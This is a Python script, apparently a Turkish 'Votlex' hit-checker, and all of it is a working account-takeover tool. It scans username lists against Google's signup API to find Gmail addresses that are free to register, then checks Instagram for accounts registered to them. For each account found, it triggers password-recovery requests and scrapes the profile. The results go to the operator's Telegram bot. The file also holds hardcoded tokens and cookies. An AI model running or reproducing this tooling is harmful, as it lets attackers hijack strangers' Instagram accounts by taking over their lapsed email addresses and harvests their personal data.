import os
import sys
import time
import random
import requests
import datetime
import pytz
import json
from uuid import uuid4
from faker import Faker
from secrets import token_hex
from user_agent import generate_user_agent
from random import choice, randrange
from threading import Thread
from rich.console import Console
import re
from random import choice as cc, randint as rr
from uuid import uuid4 as gg
try:
    import urllib.request
except ModuleNotFoundError:
    os.system("pip install urllib.request")

try:
    from rich.console import Console
except ModuleNotFoundError:
    os.system("pip install rich")
    os.system("clear")
#»»»»»»»»☝︎☝︎☝︎{𝐩𝐢𝐩}»»»»»»»»»»#
basarli_ig = 0

hatali_ig = 0

basarli_gmail = 0

hatali_gmail = 0

votlexkk = 0

votlexbbb = 0

#»»»»»»»{𝐝𝐞𝐠𝛊𝐬𝐤𝐞𝐧}☝︎☝︎☝︎
E = '\033[1;31m'
G = '\033[1;35m'
Z = '\033[1;31m'  
X = '\033[1;33m'  
Z1 = '\033[2;31m'  
F = '\033[2;32m'  
A = '\033[2;34m'  
C = '\033[2;35m'  
B = '\x1b[38;5;208m'  
Y = '\033[1;34m'  
M = '\x1b[1;37m'  
S = '\033[1;33m'
U = '\x1b[1;37m'  
R = '\x1b[1;34m'
a1 = '\x1b[1;31m'  
a2 = '\x1b[1;34m'  
a3 = '\x1b[1;32m'  
a4 = '\x1b[1;33m'  
a5 = '\x1b[38;5;208m'  
a6 = '\x1b[38;5;5m'  
E = '\033[1;31m'
X = '\033[1;33m'
F = '\033[2;32m'
M = '\x1b[1;37m'
B = '\x1b[38;5;208m'






ID = input('İD GİR : ')
token = input('TOKEN GİR : ')

def resetbro(email):
    global votlexbbb
    user = email.split('@')[0]
    baslik = {
    'authority': 'www.instagram.com',
    'accept': '*/*',
    'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://www.instagram.com',
    'referer': 'https://www.instagram.com/accounts/password/reset/',
    'sec-ch-prefers-color-scheme': 'dark',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-model': '""',
    'sec-ch-ua-platform': '"Linux"',
    'sec-ch-ua-platform-version': '""',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': str(generate_user_agent()),
    'x-asbd-id': '129477',
    'x-csrftoken': 'imA67qsBLyN96eLTamoh4kaZBqaoq9Hq',
    'x-ig-app-id': '936619743392459',
    'x-ig-www-claim': '0',
    'x-instagram-ajax': '1014339706',
    'x-requested-with': 'XMLHttpRequest',
}

    istek = {
    'email_or_username': f'{user}',}
    try:
        response = requests.post(
    'https://www.instagram.com/api/v1/web/accounts/account_recovery_send_ajax/',
    headers=baslik,
    data=istek,)
        rest = response.json()['contact_point']
    except:
        rest = 'RESET YOK BRO'
    try:
        baslik1 = {
    'authority': 'www.instagram.com',
    'accept': '*/*',
    'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
    f'referer': 'https://www.instagram.com/{user}/',
    'sec-ch-prefers-color-scheme': 'dark',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-model': '""',
    'sec-ch-ua-platform': '"Linux"',
    'sec-ch-ua-platform-version': '""',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
    'x-asbd-id': '129477',
    'x-csrftoken': 'imA67qsBLyN96eLTamoh4kaZBqaoq9Hq',
    'x-ig-app-id': '936619743392459',
    'x-ig-www-claim': 'hmac.AR0Gqm5ikC8qQcyoxd92BHLLfoC4rZTEkJA-MT5F6Qy5CAU3',
    'x-requested-with': 'XMLHttpRequest',}

        params = {
    'username': f'{user}',}

        re = requests.get(
    'https://www.instagram.com/api/v1/users/web_profile_info/',
    params=params,
    headers=baslik1,).json()
    
        kullanci = re['data']['user']['username']
        bio = re['data']['user']['biography']
        takipçi = re['data']['user']['edge_followed_by']['count']
        takip = re['data']['user']['edge_follow']['count']
        ad = re['data']['user']['full_name']
        id = re['data']['user']['id']
        katagori = re['data']['user']['category_name']
        gizlilik = re['data']['user']['is_private']
        tik = re['data']['user']['is_verified']
        post = re['data']['user']['edge_owner_to_timeline_media']['count']
        try:
            if id == None:tarih=None
            else:
                    try:
                        tarih=requests.get('https://mel7n.pythonanywhere.com/?id={}'.format(id)).json()['date']
                    except:tarih=None
        except:tarih=None
        votlexbbb += 1
        tlg = f'''
«««««««☾︎𝐕𝐎𝐓𝐋𝐄𝐗☽︎»»»»»»»
    [🂱] 𝐇𝐈𝐓 ➪ {votlexbbb}
    [🂱] 𝐀𝐃𝐈 ➪ {ad}
    [🂱] 𝐊.𝐀𝐃 ➪  {kullanci}
    [🂱] 𝐄𝐌𝐀𝐈𝐋 ➪ {kullanci}@gmail.com
    [🂱]𝐓𝐀𝐊𝐈𝐏𝐂̧𝐈 ➪ {takipçi}
    [🂱] 𝐓𝐀𝐊𝐈𝐏 ➪  {takip}
    [🂱]𝐈𝐃'𝐒𝐈 ➪  {id}
    [🂱] 𝐏𝐎𝐒𝐓 𝐒𝐀𝐘𝐈𝐒𝐈 ➪  {post}
    [🂱] 𝐁𝐈𝐎'𝐒𝐔 ➪' {bio}
    [🂱] 𝐌𝐀𝐕𝐈 𝐓𝐈𝐊 ? ➪ {tik}
    [🂱] 𝐇𝐄𝐒𝐀𝐏 𝐆𝐈𝐙𝐋𝐈𝐌𝐈 ? ➪ {gizlilik}
    [🂱] 𝐊𝐀𝐓𝐀𝐆𝐎𝐑𝐈 ➪ {katagori}
    [🂱] 𝐓𝐀𝐑𝐈𝐇 ➪ {tarih}
    [🂱] 𝐑𝐄𝐒𝐄𝐓 ➪ {rest}
«««««««☾︎𝐕𝐎𝐓𝐋𝐄𝐗☽︎»»»»»»»
    𝐃𝐄𝐕𝐄𝐋𝐎𝐏𝐄𝐑 : @Votlex1 @Votlextool '''
        print(tlg)
        requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text="+str(tlg))
        
    except:
        tlg = f'''
«««««««☾︎𝐕𝐎𝐓𝐋𝐄𝐗☽︎»»»»»»»
    𝐈𝐍𝐅𝐎𝐒𝐔𝐙 𝐇𝐈𝐓
    [🂱] 𝐊𝐔𝐋𝐋𝐀𝐍𝐂𝐈 𝐀𝐃𝐈 ➪ {user}
    [🂱] 𝐄𝐌𝐀𝐈𝐋 ➪ {user}@gmail.com
«««««««☾︎𝐕𝐎𝐓𝐋𝐄𝐗☽︎»»»»»»»
    𝐃𝐄𝐕𝐄𝐋𝐎𝐏𝐄𝐑 : @Votlex1 @Votlextool '''
        print(tlg)
        requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text="+str(tlg))
        
def votlex_insta(email):
    global basarli_ig, hatali_ig
    url = "https://www.instagram.com/api/v1/web/accounts/web_create_ajax/attempt/"
    
    payload = {
      'enc_password': "#PWD_INSTAGRAM_BROWSER:10:1736421502:AVVQAByDjqCz661dAt7I4WaXWojhfRVQefbzbP0wMiHQI54K8I2DOM1EiagPkyf1TyS9G2SgZvY+eQoO8JgigfGeakRsHJpRMyuUKEb9Y2nnQnQfqzoPmQ5DWyOgmAikF+vLIr8zueygeBE=",
      'email': email,
      'failed_birthday_year_count': "{}",
      'first_name': "Bababeb",
      'username': "yoklelelle",
      'opt_into_one_tap': "false",
      'use_new_suggested_user_name': "true"
    }
    
    headers = {
      'User-Agent': str(generate_user_agent()),
      'sec-ch-ua': "\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"",
      'x-ig-www-claim': "0",
      'x-web-session-id': "f1gmpo:6kvyjw:7iwyyc",
      'sec-ch-ua-platform-version': "\"\"",
      'x-requested-with': "XMLHttpRequest",
      'sec-ch-ua-full-version-list': "\"Not-A.Brand\";v=\"99.0.0.0\", \"Chromium\";v=\"124.0.6327.4\"",
      'sec-ch-prefers-color-scheme': "dark",
      'x-csrftoken': "4cKwelJ3l4nSGw45VtrbO5VIe47xcPId",
      'sec-ch-ua-platform': "\"Linux\"",
      'x-ig-app-id': "936619743392459",
      'sec-ch-ua-model': "\"\"",
      'sec-ch-ua-mobile': "?0",
      'x-instagram-ajax': "1019227817",
      'x-asbd-id': "129477",
      'origin': "https://www.instagram.com",
      'sec-fetch-site': "same-origin",
      'sec-fetch-mode': "cors",
      'sec-fetch-dest': "empty",
      'referer': "https://www.instagram.com/accounts/emailsignup/",
      'accept-language': "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7",
      'Cookie': "ig_did=2D779848-745D-4150-A945-498328A2E425; datr=uQVoZ6T8vjGRDwoZk8p5Q0nz; mid=Z2gFuQABAAHN6QellqWfQ6hZS5j8; ig_nrcb=1; ps_l=1; ps_n=1; dpr=3.0234789848327637; csrftoken=4cKwelJ3l4nSGw45VtrbO5VIe47xcPId; wd=891x1669"
    }
    
    vtl = requests.post(url, data=payload, headers=headers).text
    if "email_is_taken" in vtl:
        basarli_ig += 1
        resetbro(email)
        os.system('clear')
        print(f''' 
        𝐃𝐄𝐕𝐄𝐋𝐎𝐏𝐄𝐑 «««« (𝐕𝐎𝐓𝐋𝐄𝐗) »»»»
             ___________________________________
        (1) : {F}BAŞARLI İG  (HİT) {B}{basarli_ig}
        (2) : {E}HATALI İG {a6}{hatali_ig}
        (3) : {a2}BAŞARLI GMAİL {a2}{basarli_gmail}
        (4) : {E}HATALI GMAİL {a5}{hatali_gmail}
        (9) : {X}CHECKLENEN EMAİL {email} ''')
    else:
        hatali_ig += 1
        os.system('clear')
        print(f''' 
        «««« (𝐃𝐄𝐕𝐄𝐋𝐎𝐏𝐄𝐑) »»»»
             ___________________________________
        (1) : {F}BAŞARLI İG  (HİT) {B}{basarli_ig}
        (2) : {E}HATALI İG {a6}{hatali_ig}
        (3) : {a2}BAŞARLI GMAİL {a2}{basarli_gmail}
        (4) : {E}HATALI GMAİL {a5}{hatali_gmail}
        (9) : {X}CHECKLENEN EMAİL {email} ''')
        
    




def votlex_gmail(email):
    global hatali_gmail, basarli_gmail
    try:
        n1=''.join(cc('azertyuiopmlkjhgfdsqwxcvbn')for _ in range(rr(6,9)))
        n2=''.join(cc('azertyuiopmlkjhgfdsqwxcvbn')for _ in range(rr(3,9)))
        host=''.join(cc('azertyuiopmlkjhgfdsqwxcvbn')for _ in range(rr(15,30)))
        headers_init={"accept":"*/*","accept-language":"ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6","content-type":"application/x-www-form-urlencoded;charset=UTF-8","google-accounts-xsrf":"1","sec-ch-ua":"\"Not)A;Brand\";v=\"24\",\"Chromium\";v=\"116\"","sec-ch-ua-mobile":"?1","sec-ch-ua-platform":"\"Android\"","user-agent":str(gg())}
        res1=requests.get('https://accounts.google.com/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB',headers=headers_init)
        tok=re.search(r'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&',res1.text).group(2)
        cookies={'__Host-GAPS':host}
        headers={'authority':'accounts.google.com','accept':'*/*','accept-language':'en-US,en;q=0.9','content-type':'application/x-www-form-urlencoded;charset=UTF-8','google-accounts-xsrf':'1','origin':'https://accounts.google.com','referer':'https://accounts.google.com/signup/v2/createaccount?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&parent_directed=true&theme=mn&ddm=0&flowName=GlifWebSignIn&flowEntry=SignUp','user-agent':str(gg())}
        data={'f.req':'["'+tok+'","'+n1+'","'+n2+'","'+n1+'","'+n2+'",0,0,null,null,"web-glif-signup",0,null,1,[],1]','deviceinfo':'[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,null,0,1,"",null,null,2,2]'}
        response=requests.post('https://accounts.google.com/_/signup/validatepersonaldetails',cookies=cookies,headers=headers,data=data)
        tl=str(response.text).split('",null,"')[1].split('"')[0]
        host=response.cookies.get_dict()['__Host-GAPS']
        if'@'in email:email=str(email).split('@')[0]
        cookies={'__Host-GAPS':host}
        headers={'authority':'accounts.google.com','accept':'*/*','accept-language':'en-US,en;q=0.9','content-type':'application/x-www-form-urlencoded;charset=UTF-8','google-accounts-xsrf':'1','origin':'https://accounts.google.com','referer':'https://accounts.google.com/signup/v2/createusername?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&parent_directed=true&theme=mn&ddm=0&flowName=GlifWebSignIn&flowEntry=SignUp&TL='+tl,'user-agent':str(gg())}
        params={'TL':tl}
        data=('continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ddm=0&flowEntry=SignUp&service=mail&theme=mn&f.req=%5B%22TL%3A'+tl+'%22%2C%22'+email+'%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888&cookiesDisabled=false&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D&gmscoreversion=undefined&flowName=GlifWebSignIn&')
        response = requests.post(
    'https://accounts.google.com/_/signup/usernameavailability',
    params=params,
    cookies=cookies,
    headers=headers,
    data=data
).text

        if '"gf.uar",1' in response:
            basarli_gmail += 1
            votlex_insta(email)
            os.system('clear')
            print(f''' 
𝐃𝐄𝐕𝐄𝐋𝐎𝐏𝐄𝐑 «««(𝐕𝐎𝐓𝐋𝐄𝐗)»»»»
___________________________________
(1) : {F}BAŞARLI İG  (HİT) {B}{basarli_ig}
(2) : {E}HATALI İG {a6}{hatali_ig}
(3) : {a2}BAŞARLI GMAİL {a2}{basarli_gmail}
(4) : {E}HATALI GMAİL {a5}{hatali_gmail}
(9) : {X}CHECKLENEN EMAİL {email} ''')

        elif '"gf.uar",2' in response or '"gf.uar",3' in response:
            hatali_gmail += 1
            os.system('clear')
            print(f''' 
𝐃𝐄𝐕𝐄𝐋𝐎𝐏𝐄𝐑 ««««(𝐕𝐎𝐓𝐋𝐄𝐗)»»»»»
___________________________________
(1) : {F}BAŞARLI İG  (HİT) {B}{basarli_ig}
(2) : {E}HATALI İG {a6}{hatali_ig}
(3) : {a2}BAŞARLI GMAİL {a2}{basarli_gmail}
(4) : {E}HATALI GMAİL {a5}{hatali_gmail}
(9) : {X}CHECKLENEN EMAİL {email} ''')
    
    except Exception as e:
        print(e)
    return False
  



def dosya():
    liste = input(f'[+]{B}LİSTE ADINI GİR: ')
    try:
        with open(liste, "r") as f:
            for line in f:
                if '@' in line:
                    email = line.strip().split('@')[0]
                else:
                    email = line.strip()
                votlex_gmail(email)
                
    except FileNotFoundError:
        print(f"{F}{liste} ADILI LİSTE VEYA DOSYA YOK TEKRAR DENE  {a1}.")
        dosya()
dosya()